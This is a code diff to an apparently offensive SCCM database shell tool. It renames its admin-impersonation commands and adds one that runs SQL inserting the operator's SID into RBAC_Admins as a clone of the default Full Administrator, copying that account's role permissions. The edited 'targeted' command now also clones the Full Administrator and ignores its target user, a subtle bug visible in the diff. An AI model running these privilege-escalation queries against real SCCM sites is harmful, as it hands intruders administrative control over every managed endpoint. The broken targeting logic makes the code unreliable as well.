@@ -133,13 +133,14 @@ class SCCM_SQLSHELL(cmd.Cmd):
     sccm_add_admin [Username] [Role]     - Add a user to a SCCM admin role
     sccm_remove_admin [Username]         - Remove a user from all SCCM admin roles
 
-    sccm_impersonate_safe [your_user] [target_user]     - Safely impersonate a target admin
-    sccm_impersonate_targeted [your_user] [target_user] - Impersonate a target admin
-    sccm_impersonate_full [your_user]                   - Impersonate the default "Full Administrator"
-    sccm_restore_targeted [SID_encoded] [target_user]   - Restore target user's SID to the one specified
-    sccm_restore_full [SID_encoded]                     - Restore default FA's SID to the one specified
+    sccm_impersonate_safe_targ [your_user] [target_user] - Safely impersonate a target admin
+    sccm_impersonate_safe_full [your_user]               - Safely impersonate the default "Full Administrator"
+    sccm_impersonate_targ [your_user] [target_user]      - Impersonate a target admin
+    sccm_impersonate_full [your_user]                    - Impersonate the default "Full Administrator"
+    sccm_restore_targeted [SID_encoded] [target_user]    - Restore target user's SID to the one specified
+    sccm_restore_full [SID_encoded]                      - Restore default FA's SID to the one specified
 
-    sccm_programs [Filter]   - Show installed programs
+    sccm_programs [Name]   - Show installed programs (use argument to filter devices)
     """
         )
 
@@ -698,9 +699,9 @@ class SCCM_SQLSHELL(cmd.Cmd):
         self.__run(query)
 
     """
-    sccm_impersonate_safe [your_user] [target_user]  - Safely impersonate a target admin
+    sccm_impersonate_safe_targ [your_user] [target_user] - Safely impersonate a target admin
     """
-    def do_sccm_impersonate_safe(self, arg=""):
+    def do_sccm_impersonate_safe_targ(self, arg=""):
         split_arg = arg.split()
         if len(split_arg) != 2:
             logging.error("Did not get expected 2 arguments [your_user] and [target_user]")
@@ -711,7 +712,23 @@ class SCCM_SQLSHELL(cmd.Cmd):
         # Grab SID
         sid_enc = self.user_to_sid(your_user)
 
-        query = f"INSERT INTO RBAC_Admins (AdminSID, LogonName, DisplayName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite, DistinguishedName, AccountType) SELECT TOP 1 {sid_enc}, LogonName, DisplayName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite, DistinguishedName, AccountType FROM RBAC_Admins WHERE LogonName ='{target_user}'; DECLARE @oldAdminID INT; DECLARE @newAdminID INT; SET @oldAdminID = (SELECT TOP 1 AdminID FROM RBAC_Admins WHERE LogonName = '{target_user}'); SET @newAdminID = (SELECT TOP 1 AdminID FROM RBAC_Admins WHERE LogonName = '{target_user}' ORDER BY AdminID DESC); INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) SELECT @newAdminID, RoleID, ScopeID, ScopeTypeID FROM RBAC_ExtendedPermissions WHERE AdminID = @oldAdminID;"
+        query = f"INSERT INTO RBAC_Admins (AdminSID, LogonName, DisplayName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite, DistinguishedName, AccountType) SELECT TOP 1 {sid_enc}, LogonName, DisplayName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite, DistinguishedName, AccountType FROM RBAC_Admins WHERE AdminID = 16777217; DECLARE @oldAdminID INT; DECLARE @newAdminID INT; SET @oldAdminID = (SELECT TOP 1 AdminID FROM RBAC_Admins WHERE AdminID = 16777217); SET @newAdminID = (SELECT TOP 1 AdminID FROM RBAC_Admins ORDER BY AdminID DESC); INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) SELECT @newAdminID, RoleID, ScopeID, ScopeTypeID FROM RBAC_ExtendedPermissions WHERE AdminID = @oldAdminID;"
+        self.__run(query)
+
+    """
+    sccm_impersonate_safe_full [your_user] - Safely impersonate the default "Full Administrator"
+    """
+    def do_sccm_impersonate_safe_full(self, arg=""):
+        split_arg = arg.split()
+        if len(split_arg) != 1:
+            logging.error("Did not get expected argument [your_user]")
+            return
+        your_user = split_arg[0]
+
+        # Grab SID
+        sid_enc = self.user_to_sid(your_user)
+
+        query = f"INSERT INTO RBAC_Admins (AdminSID, LogonName, DisplayName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite, DistinguishedName, AccountType) SELECT TOP 1 {sid_enc}, LogonName, DisplayName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite, DistinguishedName, AccountType FROM RBAC_Admins WHERE AdminID = 16777217; DECLARE @oldAdminID INT; DECLARE @newAdminID INT; SET @oldAdminID = (SELECT TOP 1 AdminID FROM RBAC_Admins WHERE AdminID = 16777217); SET @newAdminID = (SELECT TOP 1 AdminID FROM RBAC_Admins ORDER BY AdminID DESC); INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) SELECT @newAdminID, RoleID, ScopeID, ScopeTypeID FROM RBAC_ExtendedPermissions WHERE AdminID = @oldAdminID;"
         self.__run(query)
 
     """
